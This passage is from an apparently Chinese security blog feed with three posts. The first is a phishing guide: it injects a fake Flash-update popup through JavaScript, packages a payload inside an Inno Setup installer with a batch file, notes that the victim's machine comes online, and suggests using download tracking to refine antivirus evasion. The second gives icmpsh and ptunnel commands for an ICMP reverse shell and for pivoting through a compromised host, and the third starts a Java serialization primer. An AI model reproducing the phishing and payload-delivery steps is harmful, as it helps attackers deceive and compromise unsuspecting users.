LEVKzfxW/ASiiiszuCiiigAq/pWs6jod39q0y7ktpiMFk6EehB4P41Qopp2JlGMlyyV0XdT1a/1m8N3qN1JczkY3Oeg9AOgH0qlRRRcFFRVoqyCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigaCiiikMKKKKACiiigAooopgwooooJCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKBoKKKKQwooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAP/9k=&quot;&gt;&lt;/div&gt;&lt;div style=&quot;position: relative;width: 141px;height: 40px;background-repeat: no-repeat;border-radius: 4px;background-image: url(data:image/png;base64,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);font-size: 18px;line-height: 35px;margin-right: 50px;text-align: center;float: right;z-index: 9999;&quot; onclick=&quot;localStorage.setItem(\&#x27;isDown\&#x27;,4);window.location.href=\&#x27;&#x27;</span>+url+<span class="string">&#x27;\&#x27;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> div2 = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);<span class="keyword">var</span> info = navigator.userAgent;<span class="keyword">var</span> isPhone = <span class="regexp">/mobile/i</span>.test(info);</span><br><span class="line">    <span class="keyword">if</span> (!isPhone) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;isDown&#x27;</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            <span class="keyword">var</span> h = date.getHours();</span><br><span class="line">            <span class="keyword">let</span> arr = [<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>];</span><br><span class="line">            <span class="keyword">let</span> allDay = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//console.log(arr.includes(h));</span></span><br><span class="line">            <span class="keyword">if</span> (arr.includes(h) || allDay == <span class="number">1</span>) &#123;</span><br><span class="line">                div2.innerHTML=str;</span><br><span class="line">                <span class="keyword">var</span> domain = <span class="built_in">document</span>.domain;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    body.appendChild(div2);</span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        </span><br><span class="line">                    &#125;, <span class="number">5000</span>);</span><br><span class="line">                &#125;, <span class="number">3000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>这是访问效果，访问大概两秒之后就会弹出这个页面，改掉升级按钮的连接即可诱导用户下载我们改过的flash</p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206210435358.png" alt="image-20221206210435358"></p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206210530100.png" alt="image-20221206210530100"></p>
<h1 id="打包利用"><a href="#打包利用" class="headerlink" title="打包利用"></a>打包利用</h1><p>这里使用的是Inno Setup 5 增强版，打包安装包的软件。因为直接使用的rar自解压某数字会报毒的。</p>
<p>这边我们使用博主解包好的套餐，用innosetuo打开.iss文件</p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206211114655.png" alt="image-20221206211114655"></p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206211213975.png" alt="image-20221206211213975"></p>
<p>顶部这个是主执行文件，加载的文件就是第二章图里面的文件，可以自行修改，可以把前面的文件路径改为{app}会自动打包到里面去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">start  x.exe</span><br><span class="line">explorer.exe &quot;https://XX.com/&quot;</span><br></pre></td></tr></table></figure>

<p>用这个bat文件来执行exe就可，下面这个代码是访问网页的。</p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206214803069.png" alt="image-20221206214803069"></p>
<p>这是编译的截图</p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206214841525.png" alt="image-20221206214841525"></p>
<p><img src="/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/image-20221206214832064.png" alt="image-20221206214832064"></p>
<p>可以看到在完成安装的时候，电脑已经上线了。</p>
<p>这边再看下楼主的一些利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXE下载我用了hfs,下载后他肯定会安装，安装如果一切顺利会就执行到打开网站的步骤，网站我做了统计代码，如果是顺利的话是肯定会执行到最后一个步骤的。这里我也方便确认是哪个环节出了问题，如果从hfs中看到他下载了，但是网站统计没有来路，就证明应该是被杀了。这样就可以再进一步对免杀进行升级。</span><br></pre></td></tr></table></figure>

<p>后续可以学一下inno的使用，方便我们进行更多样化的钓鱼</p>
<p>感谢Bi99v师傅的文章</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>icmp隧道基础</title>
    <url>/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="icmp隧道基础"><a href="#icmp隧道基础" class="headerlink" title="icmp隧道基础"></a>icmp隧道基础</h1><p>ICMP协议既不是基于TCP，也不是基于UDP，而是直接基于网络层的IP协议，在整个网络协议栈中属于相当底层的协议了。用于实现链路连通性测试和链路追踪（我们常用的<code>ping</code>命令就是基于icmp协议实现的）。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<h2 id="ICMP报文结构"><a href="#ICMP报文结构" class="headerlink" title="ICMP报文结构"></a>ICMP报文结构</h2><p>下面介绍一下ICMP报文的结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICMP头部分为三个字段:</span><br><span class="line">type 类型 （0回应，8请求）</span><br><span class="line">code 代码</span><br><span class="line">checksum 校验和</span><br><span class="line"></span><br><span class="line">其余部分三个部分为为:</span><br><span class="line">标识符 ( identifier )，一般填写进程 PID 以区分其他 ping 进程；</span><br><span class="line">报文序号 ( sequence number )，用于编号报文序列；</span><br><span class="line">数据 ( data )，可以是任意数据；</span><br><span class="line"></span><br><span class="line">ICMP协议在实际传输中数据包：20字节IP首部 + 8字节ICMP首部+ 1472字节&lt;数据大小&gt;38字节</span><br><span class="line">ICMP首部细分为8位类型+8位代码+16位校验和+16位标识符+16位序列号</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229120816554-1672317331094.png" alt="image-20221229120816554"></p>
<h2 id="ICMP隧道原理"><a href="#ICMP隧道原理" class="headerlink" title="ICMP隧道原理"></a>ICMP隧道原理</h2><p>即是把原本其他协议内容通讯，放在<strong>选项数据</strong>位置，从而伪装成一个ICMP进行通信</p>
<p>值得一提的是，ICMP是控制协议，不需要端口号。</p>
<h2 id="实践搭建隧道"><a href="#实践搭建隧道" class="headerlink" title="实践搭建隧道"></a>实践搭建隧道</h2><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a><strong>icmpsh</strong></h3><p>icmpsh是一款使用简单，而且不需要管理员权限即可运行的程序，可以较为简答的搭建隧道并同时获得目标shell</p>
<p>我这里用虚拟机和物理机来进行实验</p>
<p>这是工具的地址<code>https://github.com/inquisb/icmpsh</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载icmpsh 到本地</span><br><span class="line">git clone https://github.com/inquisb/icmpsh.git #下载工具</span><br><span class="line">apt-get install python-impacket #安装依赖</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行监听命令，等待回连，IP 192.168.220.146是目标机器</span><br><span class="line">python icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt; </span><br><span class="line">python icmpsh_m.py 192.168.220.129 192.168.220.146</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标机器执行命令格式</span><br><span class="line">icmpsh.exe -t &lt;attacker&#x27;s-IP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>

<p> 同时值得注意到是，这个工具是基于python2运行的，python3环境运行的话会报错哦~😅</p>
<p><strong>You need to install Python Impacket library first问题解决方案：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket/</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<p>出现下面这种情况说明搭建好了</p>
<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229172143069-1672317331094.png" alt="image-20221229172143069"></p>
<p>但是这里搞忘关掉kali本身的icmp服务了，所以导致流量巨大</p>
<p>先关了，然后就可以获得一个交互式shell</p>
<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229173404402-1672317331094.png" alt="image-20221229173404402"></p>
<h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>这个工具在kali中也是内置的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line">#安装libpcap的依赖环境</span><br><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"></span><br><span class="line">#安装libpcap依赖库</span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#安装PingTunnel</span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>执行是可能的报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error while loading shared libraries: libpcap.so.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<p>执行一下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis libpcap.so.1a</span><br></pre></td></tr></table></figure>

<p>可以看到文件是存在的,只是系统找不到,做一个连接就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/local/lib/libpcap.so.1 /usr/lib/libpcap.so.1</span><br></pre></td></tr></table></figure>

<p>我们搭建以下环境进行实验(好麻烦)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx 公网vps</span><br><span class="line"></span><br><span class="line">ip2 已经拿下的目标公网服务器（我用kali来代替）</span><br><span class="line"></span><br><span class="line">ip3 无法访问，需要通过隧道才能访问的内网服务器。（虚拟机中的一个win10）</span><br></pre></td></tr></table></figure>

<p>vps 执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptunnel -p ip2 -lp 3389 -da ip3 -dp 3389 -x cookie</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p  跳板的公网IP</span><br><span class="line">-lp 指定本机的监听端口</span><br><span class="line">-da 目标服务器的内网IP</span><br><span class="line">-dp 指定目标服务器的端口</span><br><span class="line">-x  为隧道写一个隧道密码，防止隧道滥用</span><br></pre></td></tr></table></figure>

<p>你拿下的公网服务器执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptunnel -x cookie</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203234279-1672317331094.png" alt="image-20221229203234279"></p>
<p>(上面是攻击机的界面)</p>
<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203242870-1672317331094.png" alt="image-20221229203242870"></p>
<p>（上面是跳板机的界面）</p>
<p>然后我们访问攻击机的3389端口，即可远程登陆对应目标</p>
<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203317920-1672317331094.png" alt="image-20221229203317920"></p>
<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203412222-1672317331094.png" alt="image-20221229203412222"></p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化基础</title>
    <url>/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="java反序列化基础"><a href="#java反序列化基础" class="headerlink" title="java反序列化基础"></a>java反序列化基础</h1><p>闲下来研究一下反序列化(虽然目前也不算是闲下来哩)，但是总不能一直当脚本小子哩。下面的内容不是完全原创的，借鉴的别人的，毕竟是学习笔记。</p>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>其实在之前学习php的时候就学过了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化：对象 -&gt; 字符串</span><br><span class="line">反序列化：字符串 -&gt; 对象</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化的好处</span><br><span class="line">(1) 能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</span><br><span class="line">(2) 利用序列化实现远程通信，在网络上传送对象的字节序列。</span><br><span class="line">序列化与反序列化应用的场景</span><br><span class="line">(1) 想把内存中的对象保存到一个文件中或者是数据库当中。</span><br><span class="line">(2) 用套接字在网络上传输对象。</span><br><span class="line">(3) 通过 RMI 传输对象的时候。</span><br></pre></td></tr></table></figure>

<h2 id="几种创建的序列化和反序列化协议"><a href="#几种创建的序列化和反序列化协议" class="headerlink" title="几种创建的序列化和反序列化协议"></a>几种创建的序列化和反序列化协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XML&amp;SOAP</span><br><span class="line">JSON</span><br><span class="line">Protobuf</span><br></pre></td></tr></table></figure>

<h2 id="代码展示"><a href="#代码展示" class="headerlink" title="代码展示"></a>代码展示</h2><p>类文件：Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化文件 SerializationTest.java</p>
